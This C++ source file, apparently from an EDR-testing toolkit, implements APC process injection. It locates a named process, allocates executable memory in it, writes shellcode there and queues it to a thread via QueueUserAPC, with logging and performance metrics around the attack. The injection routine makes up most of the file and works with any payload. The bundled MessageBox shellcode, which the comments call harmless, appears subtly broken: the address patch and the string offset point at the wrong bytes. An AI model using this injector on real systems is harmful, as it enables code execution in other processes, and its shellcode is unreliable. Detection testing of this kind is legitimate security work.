﻿/*
 * APC Injection with Performance Monitoring - EDR Testing Tools
 * Version 3: Enhanced with performance tracking
 * 
 * Enhancements in v3:
 * - Integrated PerformanceMonitor for detailed metrics
 * - Tracks execution time, memory usage, CPU, I/O
 * - Exports performance data to CSV/JSON
 * - Retains all v2 features (RAII, error handling, logging)
 * 
 * Features from v2:
 * - RAII-based resource management (HandleGuard, MemoryGuard)
 * - Structured exception handling with custom exceptions
 * - Comprehensive logging with Logger system
 * 
 * Performance Metrics Tracked:
 * - Execution time (microseconds)
 * - Memory usage (peak, current, delta)
 * - CPU usage (percentage, time)
 * - Disk I/O (read/write bytes and operations)
 * - Process information (PID, name)
 * 
 * Usage:
 *   apc_injection_v3.exe <target_process_name>
 *   Example: apc_injection_v3.exe notepad.exe
 * 
 * Build:
 *   cl apc_injection_v3.cpp /std:c++17 /EHsc /I..\..\include
 */

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include "../../include/logger.hpp"
#include "../../include/error_handling.hpp"
#include "../../include/performance_monitor.hpp"

using namespace EDR;

// Sample shellcode (MessageBox) - x64
// This is harmless demonstration code
unsigned char shellcode[] = {
    0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 0x28
    0x48, 0x31, 0xC9,                               // xor rcx, rcx
    0x48, 0x8D, 0x15, 0x0E, 0x00, 0x00, 0x00,      // lea rdx, [rip+0xe]
    0x4D, 0x31, 0xC0,                               // xor r8, r8
    0x4D, 0x31, 0xC9,                               // xor r9, r9
    0xFF, 0x15, 0x02, 0x00, 0x00, 0x00,            // call qword ptr [rip+0x2]
    0xEB, 0x08,                                     // jmp short $+10
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MessageBoxA address (to be patched)
    'A', 'P', 'C', ' ', 'I', 'n', 'j', 'e', 'c', 't', 'e', 'd', '!', 0x00
};

/*
 * Find process ID by name using CreateToolhelp32Snapshot
 * 
 * @param processName Name of the target process
 * @return Process ID if found, 0 otherwise
 */
DWORD FindProcessByName(const std::string& processName) {
    LOG_INFO("Searching for process: " + processName);
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        throw Exception(ErrorCode::SYSTEM_CALL_FAILED,
                       "Failed to create process snapshot",
                       "FindProcessByName", __FILE__, __LINE__);
    }
    
    HandleGuard snapshotGuard(hSnapshot);
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hSnapshot, &pe32)) {
        throw Exception(ErrorCode::PROCESS_NOT_FOUND,
                       "Failed to retrieve process information",
                       "FindProcessByName", __FILE__, __LINE__);
    }
    
    do {
        if (processName == pe32.szExeFile) {
            DWORD pid = pe32.th32ProcessID;
            LOG_INFO("Found target process: " + processName + 
                    " (PID: " + std::to_string(pid) + ")");
            return pid;
        }
    } while (Process32Next(hSnapshot, &pe32));
    
    throw Exception(ErrorCode::PROCESS_NOT_FOUND,
                   "Target process not found: " + processName,
                   "FindProcessByName", __FILE__, __LINE__);
}

/*
 * Find alertable thread in target process
 * 
 * @param processId Target process ID
 * @return Thread ID if found, 0 otherwise
 */
DWORD FindAlertableThread(DWORD processId) {
    LOG_INFO("Searching for alertable thread in PID: " + std::to_string(processId));
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        throw Exception(ErrorCode::SYSTEM_CALL_FAILED,
                       "Failed to create thread snapshot",
                       "FindAlertableThread", __FILE__, __LINE__);
    }
    
    HandleGuard snapshotGuard(hSnapshot);
    
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    
    if (!Thread32First(hSnapshot, &te32)) {
        throw Exception(ErrorCode::THREAD_CREATION_FAILED,
                       "Failed to retrieve thread information",
                       "FindAlertableThread", __FILE__, __LINE__);
    }
    
    std::vector<DWORD> candidateThreads;
    
    do {
        if (te32.th32OwnerProcessID == processId) {
            candidateThreads.push_back(te32.th32ThreadID);
            LOG_INFO("Found thread: " + std::to_string(te32.th32ThreadID));
        }
    } while (Thread32Next(hSnapshot, &te32));
    
    if (candidateThreads.empty()) {
        throw Exception(ErrorCode::THREAD_CREATION_FAILED,
                       "No threads found in target process",
                       "FindAlertableThread", __FILE__, __LINE__);
    }
    
    // Return the first thread (main thread typically)
    LOG_INFO("Selected thread: " + std::to_string(candidateThreads[0]));
    return candidateThreads[0];
}

/*
 * Perform APC injection with performance monitoring
 * 
 * @param processName Name of target process
 * @param monitor PerformanceMonitor reference for tracking
 * @return true if injection succeeds, false otherwise
 * 
 * Process:
 * 1. Start performance measurement
 * 2. Find target process by name
 * 3. Open process with required access rights
 * 4. Find alertable thread in process
 * 5. Open thread with required access rights
 * 6. Allocate memory in target process
 * 7. Write shellcode to allocated memory
 * 8. Queue APC to thread
 * 9. Wait for APC to execute
 * 10. Stop performance measurement
 */
bool PerformAPCInjection(const std::string& processName,
                        PerformanceMonitor& monitor) {
    
    // Start performance measurement
    monitor.StartMeasurement("APC Injection",
                            "Inject shellcode via APC into " + processName);
    
    try {
        LOG_INFO("=== Starting APC Injection ===");
        LOG_INFO("Target Process: " + processName);
        LOG_INFO("Shellcode Size: " + std::to_string(sizeof(shellcode)) + " bytes");
        
        // Step 1: Find target process
        DWORD targetPID = FindProcessByName(processName);
        
        // Step 2: Open target process
        LOG_INFO("Opening target process...");
        HANDLE hProcess = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | 
            PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
            FALSE,
            targetPID);
        
        if (!hProcess) {
            DWORD error = GetLastError();
            throw Exception(ErrorCode::PROCESS_ACCESS_DENIED,
                           "Failed to open target process (Error: " + 
                           std::to_string(error) + ")",
                           "PerformAPCInjection", __FILE__, __LINE__);
        }
        
        HandleGuard processGuard(hProcess);
        LOG_INFO("Successfully opened target process");
        
        // Step 3: Find alertable thread
        DWORD threadId = FindAlertableThread(targetPID);
        
        // Step 4: Open target thread
        LOG_INFO("Opening target thread...");
        HANDLE hThread = OpenThread(
            THREAD_SET_CONTEXT,
            FALSE,
            threadId);
        
        if (!hThread) {
            DWORD error = GetLastError();
            throw Exception(ErrorCode::PROCESS_ACCESS_DENIED,
                           "Failed to open target thread (Error: " + 
                           std::to_string(error) + ")",
                           "PerformAPCInjection", __FILE__, __LINE__);
        }
        
        HandleGuard threadGuard(hThread);
        LOG_INFO("Successfully opened target thread");
        
        // Step 5: Get MessageBoxA address for shellcode
        HMODULE hUser32 = GetModuleHandleA("user32.dll");
        if (!hUser32) {
            hUser32 = LoadLibraryA("user32.dll");
        }
        
        FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
        if (!pMessageBoxA) {
            throw Exception(ErrorCode::API_NOT_AVAILABLE,
                           "Failed to get MessageBoxA address",
                           "PerformAPCInjection", __FILE__, __LINE__);
        }
        
        LOG_INFO("MessageBoxA address: 0x" + 
                std::to_string(reinterpret_cast<uintptr_t>(pMessageBoxA)));
        
        // Patch shellcode with MessageBoxA address
        *reinterpret_cast<ULONGLONG*>(&shellcode[24]) = 
            reinterpret_cast<ULONGLONG>(pMessageBoxA);
        
        // Step 6: Allocate memory in target process
        size_t shellcodeSize = sizeof(shellcode);
        LOG_INFO("Allocating " + std::to_string(shellcodeSize) + 
                " bytes in target process...");
        
        LPVOID pRemoteMemory = VirtualAllocEx(
            hProcess,
            NULL,
            shellcodeSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        
        if (!pRemoteMemory) {
            DWORD error = GetLastError();
            throw Exception(ErrorCode::MEMORY_ALLOCATION_FAILED,
                           "Failed to allocate memory (Error: " + 
                           std::to_string(error) + ")",
                           "PerformAPCInjection", __FILE__, __LINE__);
        }
        
        MemoryGuard memoryGuard(hProcess, pRemoteMemory, shellcodeSize);
        LOG_INFO("Memory allocated at: 0x" + 
                std::to_string(reinterpret_cast<uintptr_t>(pRemoteMemory)));
        
        // Step 7: Write shellcode to allocated memory
        LOG_INFO("Writing shellcode to target process...");
        SIZE_T bytesWritten;
        
        if (!WriteProcessMemory(
            hProcess,
            pRemoteMemory,
            shellcode,
            shellcodeSize,
            &bytesWritten)) {
            DWORD error = GetLastError();
            throw Exception(ErrorCode::MEMORY_WRITE_FAILED,
                           "Failed to write shellcode (Error: " + 
                           std::to_string(error) + ")",
                           "PerformAPCInjection", __FILE__, __LINE__);
        }
        
        LOG_INFO("Shellcode written: " + std::to_string(bytesWritten) + " bytes");
        
        // Step 8: Queue APC to thread
        LOG_INFO("Queuing APC to thread " + std::to_string(threadId) + "...");
        
        DWORD result = QueueUserAPC(
            reinterpret_cast<PAPCFUNC>(pRemoteMemory),
            hThread,
            NULL);
        
        if (result == 0) {
            DWORD error = GetLastError();
            throw Exception(ErrorCode::INJECTION_FAILED,
                           "Failed to queue APC (Error: " + 
                           std::to_string(error) + ")",
                           "PerformAPCInjection", __FILE__, __LINE__);
        }
        
        LOG_INFO("APC queued successfully");
        LOG_INFO("=== APC Injection Completed Successfully ===");
        LOG_INFO("Note: APC will execute when thread enters alertable state");
        
        // Mark as successful
        monitor.SetSuccess(true);
        
        // Stop measurement and get metrics
        auto metrics = monitor.StopMeasurement();
        
        // Print immediate metrics
        std::cout << "\n[Performance Metrics]\n";
        std::cout << "  Execution Time: " 
                  << (metrics.executionTime.count() / 1000.0) << " ms\n";
        std::cout << "  Peak Memory: " 
                  << (metrics.peakMemoryUsage / 1024.0 / 1024.0) << " MB\n";
        std::cout << "  CPU Usage: " << metrics.cpuUsagePercent << " %\n";
        
        return true;
        
    } catch (const Exception& e) {
        LOG_ERROR("APC Injection failed: " + std::string(e.what()));
        std::cerr << "[-] Error: " << e.what() << "\n";
        std::cerr << "[-] Error Code: " << static_cast<int>(e.code()) << "\n";
        
        monitor.SetSuccess(false);
        monitor.StopMeasurement();
        return false;
        
    } catch (const std::exception& e) {
        LOG_ERROR("Unexpected error: " + std::string(e.what()));
        std::cerr << "[-] Unexpected error: " << e.what() << "\n";
        
        monitor.SetSuccess(false);
        monitor.StopMeasurement();
        return false;
    }
}

int main(int argc, char* argv[]) {
    try {
        // Initialize logger
        auto& logger = Logger::Instance();
        logger.SetLevel(EDRLOG_INFO);
        logger.SetOutputFile("apc_injection_v3.log");
        logger.EnableConsole(true);
        
        LOG_INFO("=== APC Injection v3 with Performance Monitoring Started ===");
        
        std::cout << "======================================================\n";
        std::cout << "    APC Injection v3 - Performance Monitoring\n";
        std::cout << "======================================================\n\n";
        
        // Check arguments
        if (argc != 2) {
            std::cerr << "Usage: " << argv[0] << " <target_process>\n";
            std::cerr << "Example: " << argv[0] << " notepad.exe\n";
            return 1;
        }
        
        std::string processName = argv[1];
        
        // Create performance monitor
        PerformanceMonitor monitor;
        
        // Perform APC injection with performance tracking
        bool success = PerformAPCInjection(processName, monitor);
        
        if (success) {
            std::cout << "\n[+] APC Injection completed successfully!\n";
            std::cout << "\nNote: The APC will execute when the target thread\n";
            std::cout << "enters an alertable state (e.g., SleepEx, WaitForSingleObjectEx)\n";
            
            // Print detailed summary
            std::cout << "\n";
            monitor.PrintSummary();
            
            // Export performance data
            std::cout << "\nExporting performance data...\n";
            try {
                monitor.ExportToCSV("apc_injection_performance.csv");
                std::cout << "[+] CSV exported: apc_injection_performance.csv\n";
                
                monitor.ExportToJSON("apc_injection_performance.json");
                std::cout << "[+] JSON exported: apc_injection_performance.json\n";
                
            } catch (const Exception& e) {
                std::cerr << "[-] Export failed: " << e.what() << "\n";
            }
            
            return 0;
            
        } else {
            std::cerr << "\n[-] APC Injection failed!\n";
            std::cerr << "Check apc_injection_v3.log for details.\n";
            return 1;
        }
        
    } catch (const Exception& e) {
        std::cerr << "\n[FATAL ERROR] " << e.what() << "\n";
        std::cerr << "Error Code: " << static_cast<int>(e.code()) << "\n";
        LOG_ERROR("Fatal error: " + std::string(e.what()));
        return 1;
        
    } catch (const std::exception& e) {
        std::cerr << "\n[FATAL ERROR] Unexpected: " << e.what() << "\n";
        LOG_ERROR("Unexpected error: " + std::string(e.what()));
        return 1;
        
    } catch (...) {
        std::cerr << "\n[FATAL ERROR] Unknown error occurred\n";
        LOG_ERROR("Unknown fatal error");
        return 1;
    }
}
